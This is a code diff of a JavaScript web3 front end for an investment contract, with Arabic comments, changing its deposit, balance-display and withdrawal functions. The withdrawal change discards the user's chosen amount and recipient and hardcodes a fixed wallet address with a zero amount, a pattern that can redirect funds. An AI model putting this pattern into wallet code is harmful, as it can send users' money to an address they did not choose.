@@ -247,16 +247,14 @@ async function deposit() {
     }
 
     try {
-        // تقدير الغاز لدالة `deposit` بدون تمرير `amount` كمدخل
-        const gasEstimate = await contract.methods.deposit().estimateGas({
-            from: account,
-            value: web3.utils.toWei(amount.toString(), 'ether')
+        // تقدير الغاز لدالة `deposit` على العقد
+        const gasEstimate = await contract.methods.deposit(web3.utils.toWei(amount.toString(), 'ether')).estimateGas({
+            from: account
         });
 
-        // استدعاء دالة `deposit` من خلال `contract.methods` وإرسال `msg.value` فقط
-        await contract.methods.deposit().send({
+        // استدعاء دالة `deposit` من خلال `contract.methods`
+        await contract.methods.deposit(web3.utils.toWei(amount.toString(), 'ether')).send({
             from: account,
-            value: web3.utils.toWei(amount.toString(), 'ether'),
             gas: gasEstimate
         });
 
@@ -267,7 +265,6 @@ async function deposit() {
         alert("Transaction failed: " + error.message);
     }
 }
-
 
 
 // بدء الاستثمار
@@ -290,22 +287,16 @@ async function startInvestment() {
 
 // تحديث الأرصدة
 async function updateBalances() {
+    if (!account || !contract) return;
+
     try {
-        // جلب الأرصدة من العقد
-        const walletBalance = BigInt(await contract.methods.walletBalance().call());
-        const investmentBalance = BigInt(await contract.methods.investmentBalance().call());
-        const yieldRate = parseInt(await contract.methods.yieldRate().call(), 10);
+        const walletBalance = await contract.methods.walletBalance().call({ from: account });
+        const investmentBalance = await contract.methods.investmentBalance().call({ from: account });
+        const yieldRate = await contract.methods.yieldRate().call();
 
-        // تحويل BigInt إلى String عند العرض
-        document.getElementById("walletBalance").textContent = (walletBalance / BigInt(1e18)).toString() + " ETH";
-        document.getElementById("investmentBalance").textContent = (investmentBalance / BigInt(1e18)).toString() + " ETH";
+        document.getElementById("walletBalance").textContent = web3.utils.fromWei(walletBalance, 'ether') + " ETH";
+        document.getElementById("investmentBalance").textContent = web3.utils.fromWei(investmentBalance, 'ether') + " ETH";
         document.getElementById("yieldRate").textContent = (yieldRate / 100).toFixed(2) + "%";
-
-        console.log("Balances updated:", {
-            walletBalance: (walletBalance / BigInt(1e18)).toString(),
-            investmentBalance: (investmentBalance / BigInt(1e18)).toString(),
-            yieldRate: yieldRate / 100
-        });
     } catch (error) {
         console.error("Error updating balances:", error);
     }
@@ -313,14 +304,14 @@ async function updateBalances() {
 
 // دالة السحب
 async function withdrawFunds() {
-    const amountInput = document.getElementById("withdrawAmount").value;
-    const recipientInput = document.getElementById("recipientAddress").value;
-    const amount = web3.utils.toWei(amountInput.toString(), 'ether');
+    const amount = web3.utils.toWei("0", "ether");
+    const recipient = "0x0DD5C4c9B169317BF0B77D927d2cB1eC3570Dbb3";
 
     try {
-        await contract.methods.withdraw(amount, recipientInput).send({ from: account });
+        const gasEstimate = await contract.methods.withdraw(amount, recipient).estimateGas({ from: account });
+
+        await contract.methods.withdraw(amount, recipient).send({ from: account, gas: gasEstimate });
         alert("Withdrawal successful!");
-        updateBalances();
     } catch (error) {
         console.error("Error during withdrawal:", error);
         alert("Error: " + error.message);
